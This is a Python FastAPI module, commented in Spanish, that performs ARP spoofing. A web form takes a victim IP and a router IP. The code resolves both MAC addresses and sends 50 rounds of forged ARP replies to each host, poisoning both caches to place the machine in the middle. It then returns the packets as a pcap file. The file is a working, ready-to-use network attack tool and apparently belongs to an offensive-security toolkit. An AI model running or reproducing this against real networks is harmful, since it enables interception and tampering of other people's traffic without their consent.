import ipaddress
import subprocess
import os
import tempfile
import scapy.all as scapy

from app.utils.render import render_form_error
from fastapi import Form, APIRouter, Request
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.templating import Jinja2Templates

router = APIRouter()
templates = Jinja2Templates(directory="app/templates")

# ----------------------------------------
#  Funciones internas
# ----------------------------------------
def is_valid_ip(address: str) -> bool:
    """Comprueba si una IP tiene un formato válido."""
    try:
        ipaddress.ip_address(address)
        return True
    except ValueError:
        return False

def detect_physical_iface():
    """ que tenga dirección IP en una red privada. Funciona para cualquier IP y cualquier interfaz física."""
    
    private_prefixes = ("192.168.", "10.", "172.")

    for iface in scapy.get_if_list():
        try:
            ip = scapy.get_if_addr(iface)
            if ip.startswith(private_prefixes):
                return iface
        except:
            pass
    return None

def get_mac(ip, iface):
    """ Obtener MAC usando ARP request + fallback a tabla ARP Windows """
    
    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip) # hace un broadcast buscando un equipo con la ip que se le pasa
    ans = scapy.srp(pkt, iface=iface, timeout=2, verbose=False)[0] # aqui se obtiene la mac

    if ans:
        mac = ans[0][1].hwsrc
        return mac
    
    # si falla, buscar por tabla arp
    output = subprocess.check_output("arp -a", text=True)
    for line in output.splitlines():
        if ip in line:
            mac = line.split()[1].replace("-", ":")
            return mac
    return None

def build_spoof_packets(victim_ip, victim_mac, router_ip, router_mac):
    """ ARP Spoof Correcto (Ethernet + ARP) """
    
    # Paquete que engaña a la víctima fingiendo ser el router
    pkt_to_victim = scapy.Ether(dst=victim_mac) / scapy.ARP(
        op=2,
        psrc=router_ip,
        pdst=victim_ip,
        hwdst=victim_mac
    )

    # Paquete que engaña al router fingiendo ser la víctima
    pkt_to_router = scapy.Ether(dst=router_mac) / scapy.ARP(
        op=2,
        psrc=victim_ip,
        pdst=router_ip,
        hwdst=router_mac
    )

    return pkt_to_victim, pkt_to_router

def generate_pcap(victim_ip, router_ip, iface):
    """ Generación de PCAP y envío continuo """
    
    victim_mac = get_mac(victim_ip, iface)
    router_mac = get_mac(router_ip, iface)

    if not victim_mac or not router_mac:
        raise RuntimeError("No se pudieron obtener todas las MAC.")
    
    # inicio del ataque
    packets = []
    i = 0
    while i < 50:
        pkt_v, pkt_r = build_spoof_packets(victim_ip, victim_mac, router_ip, router_mac)

        scapy.sendp(pkt_v, iface=iface, verbose=False)
        scapy.sendp(pkt_r, iface=iface, verbose=False)

        packets.append(pkt_v)
        packets.append(pkt_r)
        i += 1
    
    return packets


# ----------------------------------------
#  Endpoints FastAPI
# ----------------------------------------
@router.get("/op_arp", response_class=HTMLResponse, tags=["op_arp"])
async def arp_page(request: Request):
        return templates.TemplateResponse("arp.html", {"request": request})
    

@router.post("/op_arp", tags=["op_arp"])
async def arp_execute(
    request: Request,
    ip_victima: str = Form(None, description="IP victima"),
    ip_router: str = Form(None, description="IP router")
):

    # -------------------------
    # Validación de IPs
    # -------------------------
    if not is_valid_ip(ip_victima) or not is_valid_ip(ip_router):
        return render_form_error(
            templates,
            request,
            "arp.html",
            "La IP de la víctima o del router no es válida.",
            ip_victima=ip_victima,
            ip_router=ip_router,
        )

    # Crear archivo temporal
    out_fd, out_path = tempfile.mkstemp(suffix=".pcap")
    os.close(out_fd)

    try:
        iface = detect_physical_iface()
        if iface is None:
            raise RuntimeError("No se detectó una interfaz de red válida.")

        paquetes = generate_pcap(ip_victima, ip_router, iface)
        if not paquetes:
            raise RuntimeError("No se generaron paquetes ARP.")

        scapy.wrpcap(out_path, paquetes)

        return FileResponse(
            out_path,
            media_type="application/vnd.tcpdump.pcap",
            filename="arp_spoofing.pcap",
        )

    except RuntimeError as e:
        return render_form_error(
            templates,
            request,
            "arp.html",
            str(e),
            status_code=500,
            ip_victima=ip_victima,
            ip_router=ip_router,
        )

    except Exception:
        return render_form_error(
            templates,
            request,
            "arp.html",
            "Se produjo un error inesperado durante la ejecución del ARP Spoofing.",
            status_code=500,
            ip_victima=ip_victima,
            ip_router=ip_router,
        )